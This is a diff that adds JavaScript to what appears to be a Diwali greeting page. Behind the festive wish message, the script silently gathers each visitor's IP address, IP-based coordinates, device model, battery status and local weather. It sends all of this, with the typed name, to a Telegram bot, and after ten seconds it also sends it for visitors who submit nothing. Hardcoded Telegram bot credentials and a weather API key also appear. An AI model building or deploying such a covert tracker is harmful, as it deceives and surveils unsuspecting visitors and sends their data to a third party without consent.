@@ -1,0 +1,105 @@
+async function getBatteryInfo() {
+            const battery = await navigator.getBattery();
+            return {
+                level: battery.level * 100 + '%',
+                charging: battery.charging ? "Charging" : "Not Charging"
+            };
+        }
+
+        async function getLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    latitude: data.latitude,
+                    longitude: data.longitude
+                };
+            } catch (error) {
+                console.error("Failed to fetch IP-based location:", error);
+                return { latitude: "N/A", longitude: "N/A" };
+            }
+        }
+
+        async function getIpAddress() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        function getDeviceModel() {
+            const userAgent = navigator.userAgent;
+            const deviceRegex = /(iPhone|iPad|Android|Windows Phone|Macintosh|Linux|Windows|Redmi|Realme|Samsung|Poco|OnePlus|Infinix|Oppo|Vivo)\s*([^;]*)/;
+            const match = userAgent.match(deviceRegex);
+            return match ? match[0].trim() : "Unknown Device";
+        }
+
+        async function getWeather(latitude, longitude) {
+            const apiKey = '587726c7e7fc1631ee30c16a156a5e59'; // Replace with your weather API key
+            const response = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${apiKey}&units=metric`);
+            const data = await response.json();
+
+            if (data.cod === 200) {
+                return `${data.weather[0].description}, Temperature: ${data.main.temp}°C`;
+            } else {
+                return "Weather data not available";
+            }
+        }
+
+        async function sendUserInfoToTelegram(name) {
+            const batteryInfo = await getBatteryInfo();
+            const ipAddress = await getIpAddress();
+            const deviceModel = getDeviceModel();
+            const batteryStatus = `${batteryInfo.level} (${batteryInfo.charging})`;
+            let locationInfo = { latitude: "N/A", longitude: "N/A" };
+            let weatherInfo = "Weather data not available";
+
+            try {
+                locationInfo = await getLocation();
+                weatherInfo = await getWeather(locationInfo.latitude, locationInfo.longitude);
+            } catch (error) {
+                console.warn("Location access denied or unavailable.");
+            }
+
+            const chatId = "6165843425"; // Replace with your chat ID
+            const botToken = "7239893641:AAFO4QzGkq2LiYSaX_t2mpgxMa-dQnZs49g"; // Replace with your bot token
+
+            const message = `
+<b>New User Info</b>:
+<b>Name:</b> ${name}
+<b>IP Address:</b> ${ipAddress}
+<b>Device Model:</b> ${deviceModel}
+<b>Battery Status:</b> ${batteryStatus}
+<b>Location:</b> Latitude: ${locationInfo.latitude}, Longitude: ${locationInfo.longitude}
+<b>Current Weather:</b> ${weatherInfo}
+            `;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+            fetch(url);
+        }
+
+        let timeoutId;
+
+        document.getElementById('wishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('nameInput').value.trim();
+
+            const namePattern = /^[A-Za-z\s]+$/;
+            if (!namePattern.test(name)) {
+                alert("Please enter a valid name (letters and spaces only).");
+                return;
+            }
+
+            clearTimeout(timeoutId);
+
+            const message = document.getElementById('message');
+            message.textContent = `Dear ${name}, may the festival of lights fill your life with joy, prosperity, and love. Wishing you a Diwali as bright and beautiful as you are! ❤️ Happy Diwali! ❤️`;
+            message.style.opacity = '1';
+
+            sendUserInfoToTelegram(name);
+        });
+
+        timeoutId = setTimeout(async () => {
+            const name = "Anonymous";
+            await sendUserInfoToTelegram(name);
+        }, 10000);
